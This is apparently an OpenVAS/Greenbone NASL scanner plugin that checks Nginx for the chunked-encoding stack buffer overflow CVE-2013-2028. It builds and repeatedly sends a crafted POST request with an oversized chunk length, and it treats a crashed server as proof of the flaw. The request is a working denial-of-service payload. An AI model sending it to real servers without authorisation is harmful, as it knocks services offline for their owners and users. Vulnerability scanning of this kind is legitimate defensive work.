# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nginx:nginx";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802052");
  script_version("2025-03-21T05:38:29+0000");
  script_cve_id("CVE-2013-2028");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-21 05:38:29 +0000 (Fri, 21 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-05-21 11:44:36 +0530 (Tue, 21 May 2013)");

  script_name("Nginx Chunked Transfer Encoding Stack Based Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25499");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2013/q2/291");
  script_xref(name:"URL", value:"http://mailman.nginx.org/pipermail/nginx-announce/2013/000112.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121675");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_nginx_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nginx/http/detected");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated attackers
  to cause a buffer overflow, resulting in a denial of service or potentially allowing the execution of arbitrary
  code.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"affected", value:"Nginx version 1.3.9 through 1.4.0");

  script_tag(name:"insight", value:"A stack-based buffer overflow will occur in a worker process while handling
  certain chunked transfer encoding requests.");

  script_tag(name:"solution", value:"Upgrade to Nginx version 1.5.0, 1.4.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Nginx is prone to a stack based buffer overflow vulnerability.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

if(http_is_dead(port:port)) exit(0);

bad_req = string("POST / HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Accept-Encoding: identity\r\n",
                 "Accept: */*\r\n",
                 "Transfer-Encoding: chunked\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n", "\r\n",
                 "FFFFFFFFFFFFFFED\r\n",
                 "Open Test\r\n",
                 "0\r\n", "\r\n");

for(i = 0; i < 5; i++) {
  http_send_recv(port:port, data:bad_req);
  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
